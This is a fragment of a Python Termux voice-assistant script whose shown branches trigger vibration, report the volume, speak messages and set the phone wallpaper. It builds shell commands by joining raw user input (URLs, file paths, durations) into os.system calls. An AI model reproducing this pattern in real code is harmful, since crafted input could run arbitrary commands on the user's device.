				os.system('termux-vibrate'+' '+'-d'+' '+vib_time+' '+'-f')
				os.system('termux-tts-speak vibrated')
			elif c=="show volume":
				os.system('termux-tts-speak ok sir pleas wait')
				os.system('termux-volume')
			elif c=="set wallpaper":
				os.system('termux-tts-speak pleas wait')
				set_wall=input(yellow+"what do you want to chuse if url then type u other wise p :")
				if set_wall=="u":
					url_main=input(url+"input url :")
					url_set_wall=input(bold+green+"do you want to set this wallpaper in your lock screen y/n :")
					if url_set_wall=="y":
						os.system('termux-wallpaper'+' '+'-u'+' '+url_main+' '+'-l')
					elif url_set_wall=="n":
						os.system('termux-wallpaper'+' '+'-u'+' '+url_main)
					else:
						os.system("termux-tts-speak enter a valif valiue")
				elif set_wall=="p":
					img_p_input=input(blue+"input the path of the image with full name :")
					img_p_sel=input("do you want to set the image in your lock screen image y/n :")
					if img_p_sel=="y":
						os.system('termux-wallpaper -f'+' '+img_p_input+' '+'-l')
					elif img_p_sel=="n":
						os.system('termux-wallpaper -f'+' '+img_p_input)
					else:
						os.system('termux-tts-speak pleas enter a valid option')
				# os.system('clear')
				os.system('termux-tts-speak wallpaper set')
